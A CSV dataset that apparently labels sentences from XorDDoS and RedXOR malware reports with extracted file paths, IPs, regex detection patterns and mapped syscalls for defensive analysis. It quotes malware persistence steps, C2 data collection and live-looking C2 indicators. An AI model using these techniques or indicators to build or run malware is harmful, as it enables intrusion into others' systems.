report,word,verb,objectType,prettyReg,match,label,asgSyscall,sentence
Xorddos-Intezer.csv,/etc/init.d/po1kitd-update,,FILE,/etc/init\.d/.*,0,0,,The following files are created after executing the malware on boot: /usr/syno/etc/rc.d/S99po1kitd-update.sh /etc/init.d/po1kitd-update /etc/rc2.d/S99po1kitd-update The malware checks if the rootkit is active by creating a file and removing it.
Xorddos-Intezer.csv,"permission,",,FILE,Permission,0,0,,"The file’s data used in both functions are: path, name, type, user, permission, size, time."
Xorddos-Intezer.csv,/usr/syno/etc/rc.d/S99po1kitd-update.sh,,FILE,/etc/rc.*\.d/.*,0,0,,The following files are created after executing the malware on boot: /usr/syno/etc/rc.d/S99po1kitd-update.sh /etc/init.d/po1kitd-update /etc/rc2.d/S99po1kitd-update The malware checks if the rootkit is active by creating a file and removing it.
Xorddos-Intezer.csv,127.0.0.1,send,NET,ip_addr,1,1,send(),Table 2: Data collected by the malware and sent back to the C2 server URL key	Description	Comment hostip	IP	Hardcoded to 127.0.0.1 softtype		Hardcoded to “Linux” pscaddr	MAC address	 hostname	Machine name	 hosttar	Username	Possibly “host target” hostos	Distribution	Extracted from /etc/issue or /etc/redhat-release hostcpu	Clock speed	/proc/cpuinfo hostmem	Amount of memory	/proc/meminfo hostpack		Hardcoded to “Linux” lkmtag	Is rootkit enabled	 kernel	Kernel version	Extracted from unameFigure 12 shows the communication between RedXOR and the C2.
Xorddos-Intezer.csv,UID,,ID,^UID.*,0,0,,Figure 3: Similarity between PWNLNX and RedXOR of the UID and GID used with “lchown” function call
Xorddos-Intezer.csv,158.247.208.230,,NET,ip_addr,0,0,, Network update.cloudjscdn.com 158.247.208.230 34.92.228.216 Process name po1kitd-update-k
Xorddos-Intezer.csv,GID,,ID,^GID.*,0,0,,Figure 3: Similarity between PWNLNX and RedXOR of the UID and GID used with “lchown” function call
Xorddos-Ms.csv,/var/run/gcc.pid,,FILE,/var/run,0,0,,Encrypted strings	Decoded value m7A4nQ_/nA	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4S4nAC/n&ZV\x1aA/TB	/var/run/gcc.pid m.[$n__#4%\C\x1aB]0	/lib/libudev.so m.[$n3	/lib/ m4S4nAC/nA	/var/run/ !#Ff3VE.-7\x17V[_	cat resolv.conf <Encrypted_Remote_URL>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/var/run/gcc.pid,encrypt/overwrite,FILE,/var/run,1,1,write(),"  kill_process  The kill_process thread performs the following tasks:  Decodes encrypted strings Fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file Fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so Fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process Reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  The tcp_thread triggers the connection with the C2 server decoded earlier using decrypt_remotestr()."
Xorddos-Ms.csv,chkconfig,perform,PROC,^chkconfig$,1,1,clone(),"Additionally, it performs the following tasks on a provided $pid:  Fetches the process file name corresponding to the provided $pid Deletes the file for the provided $pid Deletes the installed init services: Deletes /etc/init.d/<file_name> For runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/S90<file_name> Performs the command chkconfig –del <file_name> Performs the command update-rc.d <file_name> remove Ends the process that was provided as an argument."
